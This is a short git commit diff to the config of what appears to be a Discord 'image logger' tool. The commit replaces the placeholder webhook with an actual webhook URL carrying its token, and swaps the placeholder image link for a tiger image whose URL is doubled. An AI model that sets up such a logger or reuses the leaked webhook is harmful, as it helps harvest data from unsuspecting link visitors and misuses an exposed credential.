e9ff5d65830a0a9b448651e3a200eab1902c8913
fweeeessffs <woodsconnor90@gmail.com>
2025-03-01 11:35:52 -0800

    image.py

--- image.py
+++ image.py
@@ -13,8 +13,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1345477545834840064/_cJl5-3utOGYvveIC9eR_s13Mu73WbMyRRLfkzdBkYRvmI4QJJQHLPbFNdDlDadb1qwP",
+    "image": "https://kinsta.com/wp-content/uploads/2020/08/tiger-jpg.jpghttps://kinsta.com/wp-content/uploads/2020/08/tiger-jpg.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
